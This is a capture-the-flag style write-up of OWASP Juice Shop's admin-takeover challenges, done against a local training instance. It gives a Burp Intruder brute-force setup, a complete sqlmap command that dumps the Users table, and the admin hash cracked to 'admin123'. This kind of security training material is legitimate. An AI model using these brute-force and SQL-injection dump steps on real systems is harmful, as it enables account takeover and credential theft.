# Challenge #2 – Admin Takeover

> **Category:** Broken Authentication / Security Misconfiguration  
> **Difficulty:** ⭐⭐⭐  
> **Tools:** Burp Suite Intruder, Browser DevTools, CrackStation  
> **Video:** ▶ [Watch on Loom](https://loom.com/TBD)

---

## Table of Contents

- [Overview](#overview)
- [Vulnerability Description](#vulnerability-description)
- [Challenge 2.1 – Find the Admin Section](#challenge-21--find-the-admin-section)
  - [Reconnaissance via main.js](#reconnaissance-via-mainjs)
  - [Walkthrough](#walkthrough)
- [Challenge 2.2 – Login as Admin](#challenge-22--login-as-admin)
  - [Walkthrough – Burp Suite Intruder](#walkthrough--burp-suite-intruder)
- [Challenge 2.3 – Retrieve the Admin Password](#challenge-23--retrieve-the-admin-password)
  - [Walkthrough – Hash Cracking](#walkthrough--hash-cracking)
- [References](#references)

---

## Overview

This writeup covers a full admin takeover of the OWASP Juice Shop across three linked steps:

1. **Find the Admin Section** — discover the hidden admin route by inspecting the Angular SPA bundle
2. **Login as Admin** — brute-force the admin password using Burp Suite Intruder
3. **Retrieve the Admin Password** — crack the admin password hash using CrackStation

All challenges are performed against a clean local Docker instance on `http://localhost:4000`.

---

## Vulnerability Description

This chain combines two distinct vulnerability classes:

**Security Misconfiguration** — The admin panel is only hidden from the UI navigation but remains fully accessible via a direct URL. There is no server-side access control preventing unauthenticated users from discovering or visiting the route. Relying on obscurity instead of proper authorization is a classic misconfiguration.

**Broken Authentication** — The admin account has a weak, commonly used password with no brute-force protection in place. There is no account lockout, no rate limiting, and no multi-factor authentication — making the login endpoint trivially vulnerable to credential attacks via tools like Burp Suite Intruder.

---

## Challenge 2.1 – Find the Admin Section

### Reconnaissance via main.js

The Juice Shop is built as an **Angular Single Page Application (SPA)**. In SPAs, all routes — including hidden ones — are compiled into the JavaScript bundle served to the browser. This means the admin route is embedded in the client-side code and can be extracted without any active scanning.

The bundle file is `main.js`, loaded on every page visit.

### Walkthrough

**Step 1 – Open the browser DevTools**

Navigate to `http://localhost:4000` and open DevTools:
```
F12 → Sources → main.js
```

Or access the file directly:
```
http://localhost:4000/main.js
```

**Step 2 – Search for route definitions**

In the Sources panel, open `main.js` and search for Angular route definitions:
```
Ctrl+F → search for: path:
```

**Step 3 – Identify the admin route**

Among the extracted routes you will find:
```
path:"administration"
```

**Step 4 – Navigate to the admin section**

```
http://localhost:4000/#/administration
```

Without being logged in as admin, the page will redirect or show an error — but the route is confirmed to exist. The Juice Shop awards the **"Admin Section"** challenge at this point simply for navigating to the URL.

---

## Challenge 2.2 – Login as Admin

### Overview

The admin account email is `admin@juice-sh.op` — visible in the Juice Shop's product reviews and API responses. The goal is to brute-force the admin password using Burp Suite Intruder with a common password wordlist.

### Walkthrough – Burp Suite Intruder

**Step 1 – Capture the login request**

1. Open Burp Suite → enable Proxy intercept
2. Navigate to `http://localhost:4000/#/login`
3. Enter any credentials and click **Log in**
4. The intercepted request:

```http
POST /rest/user/login HTTP/1.1
Host: localhost:4000
Content-Type: application/json

{"email":"admin@juice-sh.op","password":"test"}
```

**Step 2 – Send to Intruder**

Right-click the request → **Send to Intruder** (`Ctrl+I`)

**Step 3 – Configure the attack position**

In the **Positions** tab:
1. Click **Clear §** to remove all auto-detected positions
2. Highlight the password value `test`
3. Click **Add §** to mark it as the injection point:

```json
{"email":"admin@juice-sh.op","password":"§test§"}
```

Set **Attack type** to: `Sniper`

**Step 4 – Load the wordlist**

In the **Payloads** tab:
1. Payload type: `Simple list`
2. Click **Load** → select your wordlist

Recommended wordlist from SecLists:
```
SecLists/Passwords/best1050.txt
```

**Step 5 – Configure grep to identify success**

In the **Settings** tab → **Grep - Match**:
1. Clear existing entries
2. Add: `authentication`

This flags responses containing the word `authentication` — which only appears in a successful login response containing the JWT token.

**Step 6 – Start the attack**

Click **Start attack**. Sort results by the `authentication` column — the successful response will stand out immediately with a `200` status code and a noticeably larger response length.

The cracked password: **`admin123`**

**Step 7 – Log in via the browser**

Navigate to `http://localhost:4000/#/login` and log in with:
```
Email:    admin@juice-sh.op
Password: admin123
```

Then navigate to:
```
http://localhost:4000/#/administration
```

The admin panel is now fully accessible.

---

## Challenge 2.3 – Retrieve the Admin Password

### Overview

The admin password hash can be retrieved from the Users table via the SQL Injection performed in Challenge #1. The hash is cracked using the online tool CrackStation, which maintains a database of billions of pre-computed hashes.

### Walkthrough – Hash Cracking

**Step 1 – Retrieve the admin hash via sqlmap**

Using the same `login_request.txt` from Challenge #1, run sqlmap with a filter for the admin account:

**Linux / macOS:**
```bash
sqlmap -r login_request_short.txt \
  -p email \
  --flush-session \
  --ignore-code=401,500 \
  --technique=B \
  --level=3 \
  --risk=2 \
  --threads=10 \
  --batch \
  --dump \
  -T Users \
  -C "id,email,password,role,username" \
  --where="email LIKE '%admin%'" \
  2>&1
```

**Windows (PowerShell):**
```powershell
sqlmap -r login_request_short.txt `
  -p email `
  --flush-session `
  --ignore-code=401,500 `
  --technique=B `
  --level=3 `
  --risk=2 `
  --threads=10 `
  --batch `
  --dump `
  -T Users `
  -C "id,email,password,role,username" `
  --where="email LIKE '%admin%'" `
  2>&1
```

**Step 2 – Extract the hash from the output**

sqlmap returns the admin record including the MD5 password hash:

```
+----+-------+--------------------+----------------------------------+----------+
| id | role  | email              | password                         | username |
+----+-------+--------------------+----------------------------------+----------+
| 1  | admin | admin@juice-sh.op  | 0192023a7bbd73250516f069df18b500 | <blank>  |
+----+-------+--------------------+----------------------------------+----------+
```

**Step 3 – Crack the hash on CrackStation**

1. Navigate to [https://crackstation.net](https://crackstation.net)
2. Paste the hash: `0192023a7bbd73250516f069df18b500`
3. Complete the CAPTCHA and click **Crack Hashes**

Result:
```
0192023a7bbd73250516f069df18b500 → admin123
```

This confirms the password found via brute-force in Challenge 2.2 and demonstrates how a leaked hash from a database dump can independently verify — or reveal — user credentials.

---

## References

- [OWASP Top 10 – A05:2021 Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)
- [OWASP Top 10 – A07:2021 Identification and Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger – Burp Suite Intruder](https://portswigger.net/burp/documentation/desktop/tools/intruder)
- [CrackStation – Hash Cracker](https://crackstation.net/)
- [SecLists – Password Wordlists](https://github.com/danielmiessler/SecLists)

---
